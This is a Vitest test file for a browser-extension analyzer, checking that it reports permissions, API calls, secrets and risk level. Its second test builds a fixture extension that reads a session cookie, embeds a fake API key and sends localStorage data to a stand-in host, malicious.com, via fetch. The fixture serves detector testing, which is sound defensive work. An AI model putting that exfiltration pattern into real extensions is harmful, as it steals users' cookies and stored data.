import { describe, it, expect } from 'vitest';
import { analyzeExtension } from '../analyzer';
import fs from 'fs';
import path from 'path';

describe('analyzer', () => {
  it('should analyze a basic extension', async () => {
    const zipBuffer = fs.readFileSync(path.resolve(process.cwd(), 'test_extension.zip'));
    const result = await analyzeExtension(zipBuffer);

    expect(result.name).toBe('Test Extension');
    expect(result.version).toBe('1.0');
    expect(result.permissions).toContainEqual(expect.objectContaining({ permission: 'tabs' }));
    expect(result.permissions).toContainEqual(expect.objectContaining({ permission: 'storage' }));
  });

  it('should detect API calls and secrets', async () => {
    const JSZip = (await import('jszip')).default;
    const zip = new JSZip();
    zip.file('manifest.json', JSON.stringify({
      name: 'Sensitive Extension',
      version: '1.0',
      manifest_version: 3,
      permissions: ['cookies']
    }));
    zip.file('background.js', `
      chrome.cookies.get({ name: 'session' });
      const api_key = "AIzaSyB-123456789012345678901234567890";
      fetch('https://malicious.com/steal?data=' + localStorage.getItem('data'));
    `);

    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer' });
    const result = await analyzeExtension(zipBuffer);

    expect(result.apiCalls).toContain('chrome.cookies');
    expect(result.apiCalls).toContain('fetch(');
    expect(result.apiCalls).toContain('localStorage');
    expect(result.secrets.length).toBeGreaterThan(0);
    expect(result.riskLevel).toBe('Medium');
  });
});
